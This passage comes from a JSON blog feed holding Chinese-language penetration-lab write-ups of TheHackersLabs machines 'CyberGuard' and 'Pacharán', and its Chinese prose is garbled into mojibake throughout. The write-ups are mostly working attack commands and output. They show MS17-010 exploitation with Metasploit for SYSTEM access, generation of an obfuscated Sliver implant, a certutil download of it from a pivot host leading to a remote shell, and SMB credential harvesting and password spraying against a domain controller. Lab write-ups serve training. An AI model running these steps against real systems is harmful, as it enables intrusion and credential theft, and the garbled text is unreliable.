100.64.0.3:3090\n```\n\nç¼–è¾‘ `/etc/proxychains4.conf` æ–‡ä»¶\n\n![image.png](/post-images/TheHackersLabsCyberGuard/image13.png)\n\næµ‹è¯•è¿æ¥ï¼Œä½¿ç”¨ä»£ç†è¿æ¥ `10.20.30.11` çš„ `SSH` æœåŠ¡\n\n![image.png](/post-images/TheHackersLabsCyberGuard/image14.png)\n\nå½“å‰ç”¨æˆ·å¯ä»¥æ‹¿åˆ° `user.txt`\n\n```bash\nian@TheHackersLabs-2-Cyberguard:~$ cat user.txt \n1850axxxxxxxxxxxxxxxxxxxxxxxxx\n```\n\n### **10.20.30.11**\n\næŸ¥çœ‹ `sudo` æƒé™\n\n```bash\nian@TheHackersLabs-2-Cyberguard:~$ sudo -l\nMatching Defaults entries for ian on TheHackersLabs-2-Cyberguard:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser ian may run the following commands on TheHackersLabs-2-Cyberguard:\n    (ALL) NOPASSWD: /usr/bin/tcpdump, /usr/sbin/arpspoof\n```\n\næˆ‘è¿™é‡Œæ‰“ç®—è¿›è¡Œææƒï¼Œä½†æ˜¯`tcpdump` å¹¶æ— æ³•è¿›è¡Œè¿è¡Œè„šæœ¬ï¼Œç´¢æ€§å…ˆæ”¾æ‰\n\nè¿™é‡Œä¸Šä¼  `fscan` è¿›è¡Œå†…ç½‘æšä¸¾\n\n```bash\nsliver (FORMIDABLE_FLOOR) > upload ../../Tools/fscan/fscan_1.8.4\n\n[*] Wrote file to /var/www/cyberguard/config/fscan_1.8.4\n```\n\næŒ‡å®š `IP` èŒƒå›´ `10.20.30.1-255`\n\n```bash\nian@TheHackersLabs-2-Cyberguard:~$ ./fscan_1.8.4 -h 10.20.30.1-255\n\n   ___                              _    \n  / _ \\     ___  ___ _ __ __ _  ___| | __ \n / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /\n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   <    \n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\   \n                     fscan version: 1.8.4\nstart infoscan\ntrying RunIcmp2\nThe current user permissions unable to send icmp packets\nstart ping\n(icmp) Target 10.20.30.11     is alive\n(icmp) Target 10.20.30.1      is alive\n(icmp) Target 10.20.30.3      is alive\n(icmp) Target 10.20.30.15     is alive\n[*] Icmp alive hosts len is: 4\n10.20.30.3:445 open\n10.20.30.3:139 open\n10.20.30.3:135 open\n10.20.30.1:80 open\n10.20.30.15:22 open\n10.20.30.11:22 open\n10.20.30.11:8080 open\n10.20.30.3:88 open\n10.20.30.1:8090 open\n[*] alive ports len is: 9\nstart vulscan\n[+] MS17-010 10.20.30.3 (Windows Server 2016 Datacenter 14393)\n[*] NetInfo \n[*]10.20.30.3\n   [->]WIN-VRU3GG3DPLJ\n   [->]10.20.30.3\n[*] NetBios 10.20.30.3      [+] DC:WIN-VRU3GG3DPLJ.cyberguard.thl      Windows Server 2016 Datacenter 14393\n[*] WebTitle http://10.20.30.11:8080   code:200 len:1045   title:Join Our Cybersecurity Team\n[*] WebTitle http://10.20.30.1         code:200 len:1039   title:Join Our Cybersecurity Team\n[*] WebTitle http://10.20.30.1:8090    code:200 len:2784   title:Login | OPNsense\n```\n\n### MS17-010 âœ…\n\nç«Ÿç„¶æšä¸¾å‡ºæ¥äº† `10.20.30.3` å­˜åœ¨æ°¸æ’ä¹‹è“ï¼ˆMS17-010ï¼‰ï¼Œå°è¯•ä¸€æ³¢\n\n```bash\nproxychains4 -q msfconsole\n```\n\n```bash\nmsf6 auxiliary(admin/smb/ms17_010_command) > run\n[*] 10.20.30.3:445        - Target OS: Windows Server 2016 Datacenter 14393\n[*] 10.20.30.3:445        - Built a write-what-where primitive...\n[+] 10.20.30.3:445        - Overwrite complete... SYSTEM session obtained!\n[+] 10.20.30.3:445        - Service start timed out, OK if running a command or non-service executable...\n[*] 10.20.30.3:445        - Getting the command output...\n[*] 10.20.30.3:445        - Executing cleanup...\n[+] 10.20.30.3:445        - Cleanup was successful\n[+] 10.20.30.3:445        - Command completed successfully!\n[*] 10.20.30.3:445        - Output for \"whoami\":\n\nnt authority\\system\n\n[*] 10.20.30.3:445        - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n```\n\nç„¶åå¯ä»¥ç›´æ¥è¯»å– `root.txt`\n\n```bash\nmsf6 auxiliary(admin/smb/ms17_010_command) > set ComMAND type C:\\\\users\\\\Administrador\\\\Documents\\\\root.txt\nComMAND => type C:\\users\\Administrador\\Documents\\root.txt\nmsf6 auxiliary(admin/smb/ms17_010_command) > run\n[*] 10.20.30.3:445        - Target OS: Windows Server 2016 Datacenter 14393\n[*] 10.20.30.3:445        - Built a write-what-where primitive...\n[+] 10.20.30.3:445        - Overwrite complete... SYSTEM session obtained!\n[+] 10.20.30.3:445        - Service start timed out, OK if running a command or non-service executable...\n[*] 10.20.30.3:445        - Getting the command output...\n[*] 10.20.30.3:445        - Executing cleanup...\n[+] 10.20.30.3:445        - Cleanup was successful\n[+] 10.20.30.3:445        - Command completed successfully!\n[*] 10.20.30.3:445        - Output for \"type C:\\users\\Administrador\\Documents\\root.txt\":\n\n0257xxxxxxxxxxxxxxxxxxxxxxxxx\n\n[*] 10.20.30.3:445        - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n```\n\næ‹¿ `shell` çš„è¯å¯ä»¥ç”Ÿæˆ `Windows` æ¤å…¥ç‰©\n\n```bash\nsliver (FORMIDABLE_FLOOR) > generate -o windows --wg 10.0.2.20 -a amd64 -f exe \n\n[*] Generated unique ip for wg peer tun interface: 100.64.0.7\n[*] Generating new windows/amd64 implant binary\n[*] Symbol obfuscation is enabled\n[*] Build completed in 1m1s\n[*] Implant saved to /root/Desktop/TheHackersLabs/CyberGuard/LONG_PRIVATE.exe\n```\n\nä¸Šä¼ åˆ° `10.20.30.11` å¹¶å¼€å¯ `HTTP` æœåŠ¡å™¨\n\n```bash\nian@TheHackersLabs-2-Cyberguard:~$ python3 -m http.server 2131\nServing HTTP on 0.0.0.0 port 2131 (http://0.0.0.0:2131/) ...\n```\n\nç„¶åé€šè¿‡ `certutil.exe` ä¸‹è½½åˆ° `c` ç›˜\n\n```bash\nmsf6 auxiliary(admin/smb/ms17_010_command) > set command \"certutil.exe -urlcache -split -f http://10.20.30.11:2131/LONG_PRIVATE.exe C:\\\\LONG_PRIVATE.exe\"\n\"\nmsf6 auxiliary(admin/smb/ms17_010_command) > run\n[*] 10.20.30.3:445        - Target OS: Windows Server 2016 Datacenter 14393\n[*] 10.20.30.3:445        - Built a write-what-where primitive...\n[+] 10.20.30.3:445        - Overwrite complete... SYSTEM session obtained!\n[+] 10.20.30.3:445        - Service start timed out, OK if running a command or non-service executable...\n[*] 10.20.30.3:445        - Getting the command output...\n[*] 10.20.30.3:445        - Executing cleanup...\n[+] 10.20.30.3:445        - Cleanup was successful\n[+] 10.20.30.3:445        - Command completed successfully!\n[*] 10.20.30.3:445        - Output for \"certutil.exe -urlcache -split -f http://10.20.30.11:2131/LONG_PRIVATE.exe\":\n\n****  En lnea  ****\n  000000  ...\n  1280000\nCertUtil: -URLCache comando completado correctamente.\n\n[*] 10.20.30.3:445        - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n```\n\nä¹‹åè¿è¡Œ `LONG_PRIVATE.exe`\n\n```bash\nmsf6 auxiliary(admin/smb/ms17_010_command) > set command \"C:\\\\LONG_PRIVATE.exe\"\nmsf6 auxiliary(admin/smb/ms17_010_command) > run\n```\n\n![image.jpg](/post-images/TheHackersLabsCyberGuard/images15.jpg)\n\nç„¶åå°±æ‹¿åˆ° `shell` äº†\n\n```bash\nsliver (LONG_PRIVATE) > shell\n\n? This action is bad OPSEC, are you an adult? Yes\n\n[*] Wait approximately 10 seconds after exit, and press <enter> to continue\n[*] Opening shell tunnel (EOF to exit) ...\n\n[*] Started remote shell with pid 1292\n\nPS C:\\Windows\\system32> whoami\nwhoami\nnt authority\\system\n```\n\n## æ€»ç»“\n\nè›®éš¾çš„ï¼Œåœ¨å¼¹ `shell`çš„æ—¶å€™å¡äº†å¾ˆä¹…ï¼ˆè¿™é‡Œçœ‹äº†`WP`æ‰çŸ¥é“è¦ç”¨`sliver`å¼¹ï¼‰\n\næ‰“å®Œä¹‹åå‘ç°ï¼Œé¢„æœŸè§£å¹¶ä¸æ˜¯ä½¿ç”¨ `MS17-010`\n\nè€Œæ˜¯åœ¨å¦å¤–ä¸€å° `Linux` ä¸»æœºä¸­ç›‘å¬æ•°æ®åŒ…èƒ½å¾—åˆ° `Victor` ç”¨æˆ·çš„ `Net-NTLM-hash` ï¼Œä¹‹åå†ä½¿ç”¨ `certipy` è¿›è¡Œæ“ä½œ\n\né¢„æœŸè§£WPï¼šhttps://blog.thehackerslabs.com/resolucion-del-ctf-cyberguard/\n\nè¿˜æœ‰å­¦ä¹ åˆ°äº† `sliver` è¿™ä¸ª `C2` æ¡†æ¶ï¼Œæ„Ÿè§‰è¿˜ä¸é”™ï¼Œä¸ç”¨è‡ªå·±å†ç«¯å£è½¬å‘æ‰èƒ½ä¸Šçº¿",
            "url": "https://www.sunsetaction.top/2025/07/28/TheHackersLabsCyberGuard",
            "title": "TheHackersLabs - CyberGuard",
            "summary": "CyberGuard https://labs.thehackerslabs.com/machine/25 ä¸€å…±æœ‰å››å°æœºå­ï¼šç¬¬ä¸€å°æ˜¯åšè·¯ç”±å™¨/é˜²ç«å¢™ã€‚å…¶ä½™ä¸‰å°å†…ç½‘ä¸»æœºã€‚ Recon PortScan æšä¸¾ HTTP æœåŠ¡ ç›®å½•çˆ†ç ´ï¼Œè¿™é‡Œæ‰«æä¹…äº†ä¼šè¢« ban æ‰ è¿™ä¸ª query å’Œè¾“å‡ºç»“æœæ„Ÿè§‰æœ‰è‚¡ç†Ÿ...",
            "date_modified": "2025-07-28T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "TheHackersLabs",
                "Windows",
                "Linux",
                "MS17-010",
                "Sliver",
                "SQLInjection"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/07/27/TheHackersLabsPacharÃ¡n",
            "content_html": "\n# PacharÃ¡n\n\n> https://labs.thehackerslabs.com/machine/61\n> \n\n![image.png](/post-images/TheHackersLabsPacharÃ¡n/image.png)\n\n## Recon\n\n### PortScan\n\n```bash\nâœ  PacharÃ¡n nmap -sn 192.168.69.0/24\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 13:00 CST\nNmap scan report for 192.168.69.1\nHost is up (0.00060s latency).\nMAC Address: 0A:00:27:00:00:11 (Unknown)\nNmap scan report for 192.168.69.2\nHost is up (0.00034s latency).\nMAC Address: 08:00:27:5F:F4:7E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.69.69\nHost is up (0.00060s latency).\nMAC Address: 08:00:27:4F:85:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.69.10\nHost is up.\nNmap done: 256 IP addresses (4 hosts up) scanned in 2.10 seconds\n```\n\n```bash\nâœ  PacharÃ¡n nmap -sT -min-rate 10000 -p- 192.168.69.69\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 13:00 CST\nWarning: 192.168.69.69 giving up on port because retransmission cap hit (10).\nStrange read error from 192.168.69.69 (104 - 'Connection reset by peer')\nNmap scan report for 192.168.69.69\nHost is up (0.00020s latency).\nNot shown: 65236 closed tcp ports (conn-refused), 275 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n47001/tcp open  winrm\n\nMAC Address: 08:00:27:4F:85:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 13.27 seconds\n```\n\n```bash\nâœ  PacharÃ¡n nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.69.69\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 13:01 CST\nNmap scan report for 192.168.69.69\nHost is up (0.00052s latency).\n\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-27 12:01:34Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PACHARAN.THL, Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PACHARAN.THL, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\nMAC Address: 08:00:27:4F:85:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Microsoft Windows 2016|2019\nOS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2019\nOS details: Microsoft Windows Server 2016 or Server 2019\nNetwork Distance: 1 hop\nService Info: Host: WIN-VRU3GG3DPLJ; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_nbstat: NetBIOS name: WIN-VRU3GG3DPLJ, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:4f:85:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n| smb2-time:\n|   date: 2025-07-27T12:01:36\n|_  start_date: 2025-07-27T11:55:15\n|_clock-skew: 6h59m57s\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.52 ms 192.168.69.69\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 16.47 seconds\n```\n\n### æšä¸¾\n\n`SMB` åŒ¿åæµ‹è¯•\n\nå¯ä»¥ä½¿ç”¨åŒ¿åè´¦æˆ·\n\n```bash\nâœ  PacharÃ¡n smbclient -L 192.168.69.69 -U anonymous\nPassword for [WORKGROUP\\anonymous]:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Admin remota\n        C$              Disk      Recurso predeterminado\n        IPC$            IPC       IPC remota\n        NETLOGON        Disk      Recurso compartido del servidor de inicio de sesiÃ³n \n        NETLOGON2       Disk      \n        PACHARAN        Disk      \n        PDF Pro Virtual Printer Printer   Soy Hacker y arreglo impresoras\n        print$          Disk      Controladores de impresora\n        SYSVOL          Disk      Recurso compartido del servidor de inicio de sesiÃ³n \n        Users           Disk      \nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 192.168.69.69 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n```\n\nç›´æ¥ç”¨`nxc`å…¨éƒ¨æ‹‰ä¸‹æ¥\n\n```bash\nâœ  PacharÃ¡n nxc smb 192.168.69.69 -u 'anonymous' -p '' --smb-timeout 9999 -M spider_plus -o DOWNLOAD_FLAG=True \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False) \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\\anonymous: (Guest)\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Started module spidering_plus with the following options:\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*]  DOWNLOAD_FLAG: True\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*]     STATS_FLAG: True\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] EXCLUDE_FILTER: ['print$', 'ipc$']\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*]   EXCLUDE_EXTS: ['ico', 'lnk']\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*]  MAX_FILE_SIZE: 50 KB\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*]  OUTPUT_FOLDER: /root/.nxc/modules/nxc_spider_plus\nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Enumerated shares\nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  Share           Permissions     Remark\nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  -----           -----------     ------\nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  ADMIN$                          Admin remota\nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  C$                              Recurso predeterminado\nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  IPC$            READ            IPC remota\nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  NETLOGON                        Recurso compartido del servidor de inicio de sesiÃ³n \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  NETLOGON2       READ            \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  PACHARAN                        \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  PDF Pro Virtual Printer                 Soy Hacker y arreglo impresoras\nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  print$                          Controladores de impresora\nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  SYSVOL                          Recurso compartido del servidor de inicio de sesiÃ³n \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  Users                           \nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] Saved share-file metadata to \"/root/.nxc/modules/nxc_spider_plus/192.168.69.69.json\".\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] SMB Shares:           10 (ADMIN$, C$, IPC$, NETLOGON, NETLOGON2, PACHARAN, PDF Pro Virtual Printer, print$, SYSVOL, Users)\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] SMB Readable Shares:  2 (IPC$, NETLOGON2)\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] SMB Filtered Shares:  1\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Total folders found:  0\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Total files found:    1\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] File size average:    22 B\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] File size min:        22 B\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] File size max:        22 B\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] File unique exts:     1 (txt)\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Downloads successful: 1\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] All files processed successfully.\n```\n\nå¾—åˆ°ä¸€ä¸ª `txt` æ–‡ä»¶ `Orujo.txt`\n\n```bash\nâœ  PacharÃ¡n cat Orujo.txt                                 \nPericodelospalotes6969#\n```\n\nåƒæ˜¯ä¸€ä¸ªå‡­æ®ï¼Œæµ‹è¯•ä¸€ä¸‹\n\n```bash\nâœ  PacharÃ¡n nxc smb 192.168.69.69 -u 'orujo' -p 'Pericodelospalotes6969' --smb-timeout 9999                             \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False) \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\\orujo:Pericodelospalotes6969 \n```\n\næˆåŠŸæ‹¿åˆ° `orujo` çš„å‡­æ®\n\n```bash\nâœ  PacharÃ¡n nxc ldap 192.168.69.69 -u 'orujo' -p 'Pericodelospalotes6969'                                  \nLDAP        192.168.69.69   389    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL)\nLDAP        192.168.69.69   389    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\\orujo:Pericodelospalotes6969\n\nâœ  PacharÃ¡n nxc winrm 192.168.69.69 -u 'orujo' -p 'Pericodelospalotes6969'\nWINRM       192.168.69.69   5985   WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL)\n/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.\n  arc4 = algorithms.ARC4(self._key)\nWINRM       192.168.69.69   5985   WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\\orujo:Pericodelospalotes6969\n```\n\n## åŸŸåˆ†æ\n\næ”¶é›†ä¿¡æ¯ä¸Š`BLoodHound`\n\n```bash\nâœ  PacharÃ¡n bloodhound-python -d 'PACHARAN.thl' -ns 192.168.69.69 --zip -c All -dc 'WIN-VRU3GG3DPLJ.PACHARAN.THL' -u orujo -p 'Pericodelospalotes6969'\nINFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: pacharan.thl\nINFO: Getting TGT for user\nWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)\nINFO: Connecting to LDAP server: WIN-VRU3GG3DPLJ.PACHARAN.THL\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: WIN-VRU3GG3DPLJ.PACHARAN.THL\nINFO: Found 17 users\nINFO: Found 53 groups\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: WIN-VRU3GG3DPLJ.PACHARAN.THL\nINFO: Done in 00M 01S\nINFO: Compressing output into 20250727132554_bloodhound.zip\n```\n\nå½“å‰ç”¨æˆ·æ‰€å±ç»„\n\n![image.png](/post-images/TheHackersLabsPacharÃ¡n/image1.png)\n\næ‰€æœ‰åŸŸç”¨æˆ·\n\n![image.png](/post-images/TheHackersLabsPacharÃ¡n/image2.png)\n\nè¿œç¨‹ç®¡ç†ç»„æˆå‘˜ï¼Œåªæœ‰ä¸€ä¸ªï¼Œæš‚æ—¶è®¾å®šä¸ºç›®æ ‡ç”¨æˆ·\n\n![image.png](/post-images/TheHackersLabsPacharÃ¡n/image3.png)\n\n## To Whisky\n\næˆ‘ä»¬ç»§ç»­æšä¸¾ä¸€ä¸‹ä¿¡æ¯\n\næ‹‰å– `orujo` ç”¨æˆ·å¯ä»¥ä¸‹è½½çš„æ‰€æœ‰æ–‡ä»¶\n\n```bash\nnxc smb 192.168.69.69 -u 'orujo' -p 'Pericodelospalotes6969' --smb-timeout 9999 -M spider_plus -o DOWNLOAD_FLAG=True\n```\n\nèƒ½ä¸‹è½½å‡ºæ¥ä¸€ä¸ª `au.txt` æ–‡ä»¶ï¼Œæ˜¯ä¸€ä¸ªå¯†ç å­—å…¸\n\n![image.png](/post-images/TheHackersLabsPacharÃ¡n/image4.png)\n\næŸ¥è¯¢ä¸€ä¸‹å¯†ç é˜ˆå€¼\n\n```bash\nâœ  PACHARAN bloodyAD -d 'PACHARAN.THL' -u orujo -p 'Pericodelospalotes6969' --dc-ip 192.168.69.69 get object 'DC=PACHARAN,DC=THL' --attr minPwdLength,maxPwdAge,minPwdAge,pwdHistoryLength,lockoutThreshold,lockoutDuration,lockOutObservationWindow,pwdProperties\n\ndistinguishedName: DC=PACHARAN,DC=THL\nlockOutObservationWindow: -18000000000\nlockoutDuration: -18000000000\nlockoutThreshold: 0\nmaxPwdAge: -42 days, 0:00:00\nminPwdAge: -1 day, 0:00:00\nminPwdLength: 7\npwdHistoryLength: 24\npwdProperties: 1\n```\n\nå¯†ç é˜ˆå€¼ä¸º`0` ï¼Œé”å®šè´¦æˆ·åŠŸèƒ½è¢«ç¦ç”¨\n\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å¾—åˆ°çš„å­—å…¸æ¥è¿›è¡Œå¯†ç å–·æ´’\n\n```bash\nâœ  PacharÃ¡n nxc smb 192.168.69.69 -u users.txt  -p ah.txt --smb-timeout 9999 --continue-on-success | grep '[+]'\nSMB                      192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\\Whisky:MamasoyStream2er@ \n```\n\nå¾—åˆ°`Whisky`çš„å‡­æ®ï¼Œ`Whisky:MamasoyStream2er@` \n\n## To Chivas Regal\n\nè¿™é‡Œå°è¯•äº†å¾ˆå¤šçš„æ”»å‡»ï¼Œä¾‹å¦‚ `Kerberoate`ç­‰\n\nå†å°è¯•æšä¸¾ä¸€ä¸‹ä¿¡æ¯\n\nSMB ä¸­æˆ‘ä»¬èƒ½æ³¨æ„åˆ° **`PDF Pro Virtual Printer WRITE`** ï¼Œåº”è¯¥æ˜¯æ‰“å°æœºå…±äº«\n\nå¹¶ä¸”æè¿°ï¼šæˆ‘æ˜¯ä¸€åé»‘å®¢ï¼Œæˆ‘ä¿®ç†æ‰“å°æœºï¼Œé€šç”¨æ–‡æ¡£è½¬æ¢å™¨\n\n![image.png](/post-images/TheHackersLabsPacharÃ¡n/image5.png)\n\nå°è¯•è¿æ¥ä¸Š`RPCclient` æšä¸¾æ‰“å°æœº\n\n```bash\nâœ  PacharÃ¡n rpcclient 192.168.69.69 -U pacharan.thl/Whisky%MamasoyStream2er@ \nrpcclient $> enumprinters\n        flags:[0x800000]\n        name:[\\\\192.168.69.69\\Soy Hacker y arreglo impresoras]\n        description:[\\\\192.168.69.69\\Soy Hacker y arreglo impresoras,Universal Document Converter,TurkisArrusPuchuchuSiu1]\n        comment:[Soy Hacker y arreglo impresoras]\n```\n\næˆ‘ä»¬è¿˜çœ‹åˆ°æè¿°åè¿˜å¸¦è¿™ä¸ªå­—ç¬¦ä¸² `TurkisArrusPuchuchuSiu1` \n\næˆ‘ä»¬å°†å…¶æ‹¿å»è¿›è¡Œå¯†ç å–·æ´’\n\n```bash\nâœ  PacharÃ¡n nxc smb 192.168.69.69 -u users.txt -p 'TurkisArrusPuchuchuSiu1' --smb-timeout 9999                \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False) \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\\Administrador:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\\Invitado:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\\krbtgt:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\\DefaultAccount:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\\Orujo:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\\Ginebra:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\\Whisky:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\\Hendrick:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\\Chivas Regal:TurkisArrusPuchuchuSiu1\n```\n\nå¾—åˆ°ä¸€ä¸ªå‡­æ®ï¼š`ChivasRegal:TurkisArrusPuchuchuSiu1`\n\nå°±æ˜¯æˆ‘ä»¬ä¸Šè¾¹çœ‹åˆ°è¿œç¨‹ç®¡ç†ç»„çš„ç”¨æˆ·\n\n```bash\nâœ  PacharÃ¡n nxc winrm 192.168.69.69 -u 'Chivas Regal' -p 